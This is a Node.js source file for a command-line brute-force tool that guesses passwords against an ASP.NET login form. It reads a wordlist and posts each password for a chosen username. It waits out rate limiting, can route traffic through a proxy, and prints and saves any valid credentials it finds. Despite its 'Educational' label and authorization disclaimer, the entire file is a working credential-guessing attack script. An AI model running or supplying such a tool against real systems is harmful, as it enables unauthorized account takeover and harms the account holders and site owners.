#!/usr/bin/env node
/**
 * ASP.NET Login Brute Forcer (Educational)
 * Use only on systems you own or have written authorization to test
 *
 * Usage:
 *   node brute-force-login.js --target http://localhost:8080/login --username admin --wordlist ../wordlists/test-passwords.txt
 *
 * Features:
 *   - Rate limiting (configurable delay)
 *   - Progress tracking
 *   - VPN/Proxy support
 *   - JSON output
 *   - Resume capability
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const { URL } = require('url');

// Configuration
const args = process.argv.slice(2);
const config = {
  target: getArg('--target') || 'http://localhost:8080/login',
  username: getArg('--username') || 'admin',
  wordlist: getArg('--wordlist') || '../wordlists/test-passwords.txt',
  delay: parseInt(getArg('--delay')) || 1000, // ms between attempts
  proxy: getArg('--proxy'), // http://proxy:port
  userAgent: getArg('--user-agent') || 'Mozilla/5.0 (Educational Brute Force Tool)',
  outputFile: getArg('--output') || 'brute-force-results.json',
  resume: getArg('--resume') || false,
  verbose: args.includes('--verbose') || args.includes('-v'),
  method: getArg('--method') || 'POST', // POST or JSON
};

function getArg(name) {
  const index = args.indexOf(name);
  return index !== -1 && args[index + 1] ? args[index + 1] : null;
}

// Stats
const stats = {
  startTime: Date.now(),
  attempted: 0,
  failed: 0,
  rateLimited: 0,
  errors: 0,
  found: null,
  totalPasswords: 0
};

// Load wordlist
function loadWordlist(file) {
  try {
    const content = fs.readFileSync(file, 'utf8');
    return content.split('\n').filter(line => line.trim().length > 0);
  } catch (err) {
    console.error(`[ERROR] Failed to load wordlist: ${err.message}`);
    process.exit(1);
  }
}

// Make HTTP request
function makeRequest(username, password) {
  return new Promise((resolve, reject) => {
    const targetUrl = new URL(config.target);
    const isHttps = targetUrl.protocol === 'https:';
    const httpModule = isHttps ? https : http;

    // Prepare request data
    let postData;
    let contentType;

    if (config.method === 'JSON') {
      postData = JSON.stringify({ user: username, username: username, password: password });
      contentType = 'application/json';
    } else {
      postData = `user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&btnSubmit=Submit`;
      contentType = 'application/x-www-form-urlencoded';
    }

    const options = {
      hostname: targetUrl.hostname,
      port: targetUrl.port || (isHttps ? 443 : 80),
      path: targetUrl.pathname + targetUrl.search,
      method: 'POST',
      headers: {
        'Content-Type': contentType,
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': config.userAgent,
      },
    };

    // Proxy support
    if (config.proxy) {
      const proxyUrl = new URL(config.proxy);
      options.hostname = proxyUrl.hostname;
      options.port = proxyUrl.port;
      options.path = config.target;
      options.headers['Host'] = targetUrl.hostname;
    }

    const req = httpModule.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: body
        });
      });
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

// Check if login was successful
function isSuccess(response) {
  // Success indicators:
  // - 302 redirect
  // - Set-Cookie header
  // - No "Invalid" or "Failed" in body

  if (response.status === 302) return true;
  if (response.headers['set-cookie']) return true;
  if (response.body.includes('Welcome') || response.body.includes('Dashboard')) return true;
  if (!response.body.includes('Invalid') && !response.body.includes('Failed')) return true;

  return false;
}

// Check if rate limited
function isRateLimited(response) {
  if (response.status === 429) return true;
  if (response.body.includes('Too Many') || response.body.includes('Rate Limit')) return true;
  return false;
}

// Attempt login
async function attemptLogin(username, password) {
  try {
    const response = await makeRequest(username, password);

    if (isRateLimited(response)) {
      stats.rateLimited++;
      if (config.verbose) {
        console.log(`[RATE LIMITED] Sleeping 60s...`);
      }
      await sleep(60000); // Wait 60s if rate limited
      return { success: false, rateLimited: true };
    }

    if (isSuccess(response)) {
      return { success: true, response };
    }

    return { success: false, response };
  } catch (err) {
    stats.errors++;
    if (config.verbose) {
      console.error(`[ERROR] ${err.message}`);
    }
    return { success: false, error: err.message };
  }
}

// Sleep utility
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Save results
function saveResults() {
  const results = {
    config: {
      target: config.target,
      username: config.username,
      wordlist: config.wordlist,
    },
    stats: {
      ...stats,
      duration: Date.now() - stats.startTime,
      attemptsPerSecond: stats.attempted / ((Date.now() - stats.startTime) / 1000),
    },
  };

  fs.writeFileSync(config.outputFile, JSON.stringify(results, null, 2));
}

// Progress bar
function updateProgress(current, total, password) {
  const percent = ((current / total) * 100).toFixed(1);
  const bar = '█'.repeat(Math.floor(percent / 2)) + '░'.repeat(50 - Math.floor(percent / 2));
  const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(0);
  const rate = (stats.attempted / elapsed).toFixed(1);

  process.stdout.write(`\r[${bar}] ${percent}% | ${current}/${total} | ${rate}/s | Testing: ${password.padEnd(20)}`);
}

// Main
async function main() {
  console.log('\n ASP.NET Login Brute Forcer (Educational)\n');
  console.log('='.repeat(60));
  console.log(`Target: ${config.target}`);
  console.log(`Username: ${config.username}`);
  console.log(`Wordlist: ${config.wordlist}`);
  console.log(`Delay: ${config.delay}ms`);
  console.log(`Proxy: ${config.proxy || 'None'}`);
  console.log('='.repeat(60));
  console.log('');

  // Load passwords
  const passwords = loadWordlist(config.wordlist);
  stats.totalPasswords = passwords.length;

  console.log(`[*] Loaded ${passwords.length} passwords\n`);
  console.log('[*] Starting brute force attack...\n');

  // Brute force loop
  for (let i = 0; i < passwords.length; i++) {
    const password = passwords[i].trim();

    updateProgress(i + 1, passwords.length, password);

    const result = await attemptLogin(config.username, password);
    stats.attempted++;

    if (result.success) {
      console.log(`\n\n[OK] SUCCESS! Valid credentials found:\n`);
      console.log(`   Username: ${config.username}`);
      console.log(`   Password: ${password}\n`);
      stats.found = { username: config.username, password };
      saveResults();
      return;
    }

    if (!result.rateLimited) {
      stats.failed++;
    }

    // Delay between attempts
    if (i < passwords.length - 1) {
      await sleep(config.delay);
    }
  }

  console.log(`\n\n[FAIL] No valid credentials found\n`);
  saveResults();
}

// Run
if (require.main === module) {
  main().then(() => {
    console.log('\n[STATS] Stats:');
    console.log(`   Total attempts: ${stats.attempted}`);
    console.log(`   Failed: ${stats.failed}`);
    console.log(`   Rate limited: ${stats.rateLimited}`);
    console.log(`   Errors: ${stats.errors}`);
    console.log(`   Duration: ${((Date.now() - stats.startTime) / 1000).toFixed(1)}s\n`);
    console.log(`Results saved to: ${config.outputFile}\n`);
    process.exit(stats.found ? 0 : 1);
  }).catch(err => {
    console.error(`\n[FATAL] ${err.message}\n`);
    process.exit(1);
  });
}

module.exports = { attemptLogin, loadWordlist };
